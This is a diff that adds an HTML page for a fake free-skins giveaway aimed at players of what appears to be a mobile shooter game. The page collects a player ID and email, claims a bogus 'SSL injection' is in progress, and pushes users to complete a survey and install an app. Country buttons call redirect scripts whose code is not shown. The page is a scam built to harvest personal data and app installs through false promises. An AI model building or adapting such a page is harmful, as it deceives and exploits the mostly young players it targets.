@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="JS/1stscript.js"> </script>
+  <script type="text/javascript" src="JS/script.js"></script>
+  <script type="text/javascript" src="JS/redbd.js"></script>
+<script type="text/javascript" src="JS/redindia.js"></script>
+<script type="text/javascript" src="JS/redindo.js"></script>
+<script type="text/javascript" src="JS/redph.js"></script>
+
+
+  </script>
+
+    <link rel="stylesheet" type="text/css" href="style.css">
+
+  </head>
+  <body>
+
+<div class="container d-flex justify-content-center align-items-center mainbox bgimg">
+  <form id="Submitfrm" >
+    <div class="frmbg">
+      <h1 class="text-center">Grab the skins now !</h1>
+      <hr style="width: 3rem;">
+      <div class="row">
+        <div class="col-md-6">
+          <div class="form-group">
+            <input type="text" class="form-control transparent-input" id="id" placeholder="ID number" required>
+          </div>
+        </div>
+        <div class="col-md-6">
+          <div class="form-group">
+            <input type="email" class="form-control transparent-input" id="email" placeholder="Email" required>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="weapon">Weapon:</label>
+        <select class="form-control transparent-input" id="weapon" required>
+          <option value="">Choose weapon</option>
+          <option value="1">UMP</option>
+          <option value="2">Thompson</option>
+          <option value="3">M1887</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label for="skin">Skin:</label>
+        <select class="form-control transparent-input" id="skin" disabled required>
+          <option value="">Choose skin</option>
+          <option value="1">Art of War (UMP)</option>
+          <option value="2">Pumpkin Flame (UMP)</option>
+          <option value="3">Firehound Jaguar (Thompson)</option>
+          <option value="4">Dragon Mob (Thompson)</option>
+          <option value="5">Tropical Parrot (M1887)</option>
+          <option value="6">Emarald Power (M1887)</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <div class="form-check">
+          <input type="radio" class="form-check-input" id="termsAndConditions" name="termsAndConditions" required>
+          <label class="form-check-label" for="termsAndConditions">I agree to the <a href="terms.html">Terms and Conditions</a> of the campaign</label>
+        </div>
+      </div>
+    <button type="submit" class="btn btn-primary" id="submit" disabled  data-toggle="modal" data-target="#myModal">Submit</button>
+
+    </form>
+    </div>
+    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h4 class="modal-title" id="myModalLabel">Almost there</h4>
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">&times;</span>
+            </button>
+          </div>
+          <div class="modal-body">
+            <p>The SSL injection is under process. Please Make sure that the information you provided are correct</p>
+            <p>Please Complete the survey to Complete the process . <span id="referralCode"></span></p>
+          </div>
+          <div class="modal-footer">
+            <button type="button" class="btn btn-primary" onclick="openSecondModal()">
+              Launch survey
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Second Modal -->
+    <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+      <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" id="exampleModalLongTitle">Please select your country</h5>
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">&times;</span>
+            </button>
+          </div>
+          <div class="modal-body">
+  <h2 class="notic">You must Sign up and use the app for 5 minutes after downloading in order to make the SSL injection successfull.</h2>
+          </div>
+      <div class="modal-footer row">
+        <button type="button" class="btn btn-primary cntbtn" onclick="redirectToSocialBD()">Bangladesh</button>
+        <button type="button" class="btn btn-primary cntbtn" onclick="redirectToSocialindia()">India</button>
+        <button type="button" class="btn btn-primary cntbtn" onclick="redirectToSocialindo()">Indonesia</button>
+        <button type="button" class="btn btn-primary cntbtn" onclick="redirectToSocialph()">Phiilippines</button>
+
+      </div>
+        </div>
+      </div>
+    </div>
+</body>
+</html>
